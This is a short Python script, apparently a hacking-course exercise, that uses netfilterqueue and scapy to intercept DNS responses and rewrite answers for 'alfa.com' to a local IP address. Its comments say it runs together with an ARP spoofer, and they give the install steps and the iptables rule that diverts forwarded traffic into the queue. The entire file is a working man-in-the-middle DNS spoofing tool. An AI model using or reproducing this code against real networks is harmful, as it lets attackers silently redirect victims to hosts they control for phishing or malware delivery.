#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy


# processing packet for further changes, like now we are redirecting to another IP
def process_packet(packet):
    # loading  packet with scapy
    scapy_packet = scapy.IP(packet.get_payload())

    # check scapy packet if it has dns response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        # check if the request contain website we want to spoof
        if "alfa.com" in str(qname):
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata="10.2.0.4")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
# in binding we specify the queue that we choose in iptable command
queue.bind(0, process_packet)
queue.run()

# we activate the arp_spoofer so we can intercept any request.
# what happens in this file is we trap the requests from target in our queue
# so we can drop/ accpet/ modify it.

# this is how to insall netfilterqueue in python 3.8
# apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
# pip3 install -U git+https://github.com/kti/python-netfilterqueue

# in terminal : iptables -I FORWARD -j NFQUEUE --queue-num 0
# to delete ip tables in terminal : iptables --flush
